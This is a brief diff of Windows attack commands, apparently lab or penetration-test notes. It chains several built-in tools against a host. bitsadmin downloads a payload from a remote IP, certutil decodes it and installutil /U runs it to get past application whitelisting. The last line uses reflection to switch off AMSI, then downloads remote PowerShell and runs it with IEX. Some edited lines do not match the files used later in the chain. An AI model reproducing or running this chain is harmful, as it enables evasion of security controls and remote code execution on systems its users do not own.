@@ -1,4 +1,7 @@
-bitsadmin /Transfer myJob http://192.168.45.208/file.txt C:\users\ted\enc.txt 
+cmd.exe /c bitsadmin /Transfer myJob http://192.168.45.185/ref.txt C:\windows\temp\ref.ps1
 certutil -decode C:\users\ted\enc.txt C:\users\ted\Bypass.exe
 del C:\users\ted\enc.txt
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\ted\Bypass.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\windows\temp\bypass.exe
+
+(([Ref].Assembly.gettypes() | ? {$_.Name -like \"Am*s\"}).GetFields(\"NonPublic,Static\") | ? {$_.Name -like \"am*ed\"}).SetValue($null,$true);(New-Object System.Net.WebClient).DownloadString('http://192.168.45.233/ref.txt') | IEX
